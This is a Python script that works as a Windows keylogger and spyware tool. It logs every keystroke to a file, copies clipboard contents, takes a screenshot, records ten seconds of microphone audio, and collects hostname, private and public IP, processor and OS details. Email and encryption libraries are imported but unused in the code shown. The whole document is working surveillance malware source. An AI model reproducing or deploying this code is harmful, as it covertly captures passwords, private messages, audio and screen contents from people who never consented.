# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write

import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


microphone_time = 10

system_information = "systetminfo.txt"
keys_information = "key_log.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"




file_path = ""
extend = "\\"
file_merge = file_path + extend

count = 0
keys = []


def computer_information():
    with open(file_path+extend+system_information, "w") as f:
        hostname= socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address " + public_ip + '\n')

        except Exception:
            f.write("Couldnt get Public IP Address"+ '\n')
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + (platform.system()) + ' ' + platform.version() + '\n')
        f.write("Private Ip Address: " + IPAddr + '\n')
     

def copy_clipboard():
    with open(file_path+extend+clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + "\n " + pasted_data)

        except:
            f.write("Clipboard cannot be copied!")



def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds)*fs, samplerate=fs, channels=2 )
    sd.wait()


    write(file_path+extend+audio_information,fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_information)

def on_press(key):
    global keys,count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count += 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information,"a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()


            elif k.find("Key") == -1:
                f.write(k)
                f.close()
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

computer_information() 

copy_clipboard()

screenshot()

microphone()